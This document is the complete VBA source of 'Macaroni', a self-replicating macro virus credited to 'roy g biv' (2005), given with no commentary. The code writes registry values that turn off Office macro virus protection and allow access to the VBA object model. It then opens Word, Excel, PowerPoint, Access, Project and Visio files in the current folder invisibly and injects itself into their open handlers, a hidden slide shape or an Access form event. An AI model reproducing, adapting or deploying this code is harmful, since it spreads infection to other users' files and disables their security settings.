'Macaroni - roy g biv 05/02/05
a=array("doc","xls","ppt","mdb","mpp","vsd")
b=array("Word","Excel","PowerPoint","Access","Project","Visio")
c=array("Document","WorkBook","p","d",b(4),"Document")
y="byval z as "
dim d(6)
d(4)=y+b(4)
d(5)=y+"iv"+c(0)
e = 0
f="This"+c(e)
g="m"
on error resume next
vbe.activevbproject.vbcomponents(f).export(g)
set h=activedocument
set h=activeworkbook
set h=activeproject
set h=activepresentation
h.vbproject.vbcomponents(f).export(g)
set i=createobject("scripting.filesystemobject")
j=i.opentextfile(g).readall
j=mid(j,instr(j,"'M"))
j=left(j,instr(j,"'"+"'")+1)
i.getfile(g).delete
randomize
e=int(rnd*6)
f="This"+c(e)
g=instr(j,"e = ")
k=vbcrlf
g=k+left(j,g+3)+cstr(e)+mid(j,g+5)+k+"end "
set j=createobject("wscript.shell")
l="HKCU\software\microsoft\"
m=l+"office\8.0\"
n="REG_SZ"
j.regwrite m+"Word\Options\EnableMacroVirusProtection",0,n
j.regwrite m+"MS Project\Options\General\Macro Virus Protection","No",n
n="REG_DWORD"
j.regwrite m+"Excel\Microsoft Excel\Options6",0,n
j.regwrite m+"PowerPoint\Options\MacroVirusProtection",0,n
m=b(e)
if e=4then m="MS "+m
for o=9to 12
p=l
if e<>5then p=p+"Office\"+cstr(o)+".0\"
p=p+m+"\Security\"
j.regwrite p+"Level",1,n
j.regwrite p+"AccessVBOM",1,n
next
set j=i.getfolder(".")
for each l in j.files
if lcase(i.getextensionname(l))=a(e)then
l=l.path
err=0
set n=i.opentextfile(l,8)
if err.number=0then
if e=5then
set n=createobject(m+".invisibleapp")
else
if e=4then m="MS"+b(e)
set n=createobject(m+".application")
end if
if err.number=0then
n.visible=0
n.application.automationsecurity=1
set o=n.documents
set o=n.workbooks
set o=n.presentations
err=0
if e=3then
n.opencurrentdatabase(l)
else
if e=4then
n.fileopen(l)
set o=n.activeproject
else
if e=2then n.visible=1
set o=o.open(l)
end if
end if
if err.number=0then
set l=n.vbe.activevbproject.vbcomponents(f).codemodule
set l=o.vbproject.vbcomponents(f).codemodule
p="_open"
if e=5then p="_"+c(0)+"opened"
p=c(e)+p
err=0
l=l.proccountlines(p,0)
if err.number>0then
if e=2then o.vbproject.vbcomponents.add(1).name=f
if e=3then
with n.vbe.activevbproject
.vbcomponents.add(1).name=f
set l=.vbcomponents(f).codemodule
end with
end if
set l=o.vbproject.vbcomponents(f).codemodule
o="private "
q="sub "
if e=2or e=3then
o=""
if e=3then q="function "
end if
l.addfromstring(o+q+p+"("+d(e)+")"+g+q)
with n.activepresentation
with .slidemaster
set l=.shapes.addshape(1,0,0,.width,.height)
end with
l.fill.transparency=1
with l.actionsettings(1)
.action=8
.run=p
end with
.save
.close
end with
if e=3then
n.docmd.openform n.currentproject.allforms(0).name,1
n.forms(0).onopen="="+p+"()"
n.docmd.save 5,f
end if
n.activedocument.save
n.activeworkbook.save
n.filesave
n.fileclose
end if
end if
if e<>2and e<>4then n.quit
end if
end if
end if
next
h.slideshowwindow.view.next''